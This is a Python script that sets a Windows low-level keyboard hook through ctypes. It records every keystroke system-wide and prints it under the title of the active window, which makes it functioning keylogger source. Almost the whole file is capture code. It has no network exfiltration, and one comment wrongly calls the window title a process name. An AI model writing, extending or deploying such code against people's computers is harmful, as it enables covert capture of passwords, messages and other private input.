from ctypes import *
from ctypes import wintypes

# Defining constants
user32 = windll.user32
LRESULT = c_long
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_RETURN = 0x0D
WM_SHIFT = 0x10

#function to get the length of the text
GetWindowTextLengthA = user32.GetWindowTextLengthA
GetWindowTextLengthA.argtypes = (wintypes.HWND,)
GetWindowTextLengthA.restype = wintypes.INT

#function to get the text
GetWindowTextA = user32.GetWindowTextA
GetWindowTextA.argtypes = (wintypes.HWND, wintypes.LPSTR, wintypes.INT)
GetWindowTextA.restype = wintypes.INT

#to get the toggled state of the particular key(pressed / not)
GetKeyState = user32.GetKeyState
GetKeyState.argtypes = (wintypes.INT,)
GetKeyState.restype = wintypes.SHORT

# get status of all the keys in the keyboard
KeyboardState = wintypes.BYTE * 256
GetKeyboardState = user32.GetKeyboardState
GetKeyboardState.argtypes = (POINTER(KeyboardState),)
GetKeyboardState.restype = wintypes.BOOL

# convert the captured signals to ascii signals
ToAscii = user32.ToAscii
ToAscii.argtypes = (
    wintypes.UINT,
    wintypes.UINT,
    POINTER(KeyboardState),
    wintypes.LPWORD,
    wintypes.UINT,
)
ToAscii.restype = wintypes.INT

# pass the handle or the info to the next process in the hook chain
CallNextHookEx = user32.CallNextHookEx
CallNextHookEx.argtypes = (
    wintypes.HHOOK,
    wintypes.INT,
    wintypes.WPARAM,
    wintypes.LPARAM,
)
CallNextHookEx.restype = LRESULT

#function to install a hook procedure into an system
SetWindowsHookExA = user32.SetWindowsHookExA
SetWindowsHookExA.argtypes = (
    wintypes.INT,
    CFUNCTYPE(LRESULT, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM),
    wintypes.HINSTANCE,
    wintypes.DWORD,
)
SetWindowsHookExA.restype = wintypes.HHOOK


# getting the hook message from the handle
GetMessage = user32.GetMessageW
GetMessage.argtypes = (wintypes.LPMSG, wintypes.HWND, wintypes.UINT, wintypes.UINT)
GetMessage.restype = wintypes.BOOL

class KBDLLHOOKSTRUCT(Structure):
    _fields_ = [
        ("vkCode", wintypes.DWORD),
        ("scanCode", wintypes.DWORD),
        ("flags", wintypes.DWORD),
        ("time", wintypes.DWORD),
        ("dwExtraInfo", wintypes.ULONG),
    ]

# Retrieve the foreground window's process name
def get_foreground_process():
    hwnd = user32.GetForegroundWindow()
    length = GetWindowTextLengthA(hwnd)
    if length > 0:
        buf = create_string_buffer(length + 1)  # +1 for null terminator
        GetWindowTextA(hwnd, buf, length + 1)
        return buf.value
    return b"(unknown)"

# Hook function to capture key events
def hook_function(nCode, wParam, lParam):
    global last, hook
    if nCode == 0:  # Process the message only if nCode is HC_ACTION (0)
        if last != get_foreground_process():
            last = get_foreground_process()
            print("\n[{}]".format(last.decode("latin-1")))

        if wParam == WM_KEYDOWN:
            keyboard = KBDLLHOOKSTRUCT.from_address(lParam)

            # Check the state of the keyboard and process the key press
            state = (wintypes.BYTE * 256)()
            GetKeyboardState(byref(state))

            buf = (c_ushort * 1)()
            n = ToAscii(keyboard.vkCode, keyboard.scanCode, state, buf, 0)

            if n > 0:  # If ToAscii succeeded
                if keyboard.vkCode == WM_RETURN:
                    print()  # Print newline for Enter key
                else:
                    print("{}".format(string_at(buf).decode("latin-1")), end="", flush=True)

    return CallNextHookEx(hook, nCode, wParam, lParam)

last = None
hook_proc = CFUNCTYPE(LRESULT, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM)(hook_function)

# Set the low-level keyboard hook
hook = SetWindowsHookExA(WH_KEYBOARD_LL, hook_proc, 0, 0)

# Enter message loop to capture key events
msg = wintypes.MSG()
GetMessage(byref(msg), 0, 0, 0)
